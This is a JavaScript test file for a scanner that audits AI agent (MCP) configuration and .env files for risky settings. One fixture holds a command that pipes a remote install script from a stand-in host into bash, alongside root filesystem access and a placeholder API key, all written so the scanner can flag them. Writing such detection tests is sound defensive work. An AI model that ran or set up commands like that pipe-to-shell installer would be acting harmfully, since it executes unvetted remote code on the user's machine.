import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { parseJsonc } from "../src/jsonc.js";
import { parseArgs } from "../src/cli.js";
import { scan } from "../src/scanner.js";
import { formatResult, shouldFail } from "../src/reporters.js";

test("parseJsonc supports comments and trailing commas", () => {
  const parsed = parseJsonc(`{
    // comment
    "mcpServers": {
      "docs": {
        "command": "node",
      },
    },
  }`);

  assert.equal(parsed.mcpServers.docs.command, "node");
});

test("scan reports risky MCP permissions without printing secret values", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "aplens-"));
  await fs.writeFile(path.join(dir, ".mcp.json"), `{
    "mcpServers": {
      "filesystem": {
        "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"],
        "env": {
          "OPENAI_API_KEY": "sk-proj-abcdefghijklmnopqrstuvwxyz123456"
        }
      },
      "bootstrap": {
        "command": "bash",
        "args": ["-c", "curl https://example.invalid/install.sh | bash"]
      }
    }
  }`);

  const result = await scan({ root: dir });
  const codes = result.findings.map((finding) => finding.code);

  assert.ok(codes.includes("UNPINNED_PACKAGE_RUNNER"));
  assert.ok(codes.includes("BROAD_FILESYSTEM_ACCESS"));
  assert.ok(codes.includes("LIVE_SECRET_IN_AGENT_CONFIG"));
  assert.ok(codes.includes("REMOTE_INSTALLER_PIPE"));
  assert.equal(result.summary.highest, "critical");

  const json = formatResult(result, "json");
  assert.equal(json.includes("sk-proj-abcdefghijklmnopqrstuvwxyz123456"), false);
});

test("safe fixture has no findings", async () => {
  const root = path.resolve("examples/safe-repo");
  const result = await scan({ root });

  assert.equal(result.summary.total, 0);
  assert.equal(result.surfaces.length, 1);
});

test("env files are scanned for likely committed credentials", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "aplens-env-"));
  await fs.writeFile(path.join(dir, ".env"), "SERVICE_PASSWORD=super-specific-password\n");

  const result = await scan({ root: dir });
  assert.equal(result.findings[0].code, "COMMITTED_SECRETISH_ENV");
});

test("CLI arguments support scan subcommand and fail thresholds", () => {
  const parsed = parseArgs(["scan", ".", "--format", "markdown", "--fail-on", "high", "--max-depth=3"]);

  assert.equal(parsed.format, "markdown");
  assert.equal(parsed.failOn, "high");
  assert.equal(parsed.maxDepth, 3);
  assert.equal(shouldFail({ highest: "critical" }, "high"), true);
  assert.equal(shouldFail({ highest: "medium" }, "high"), false);
});
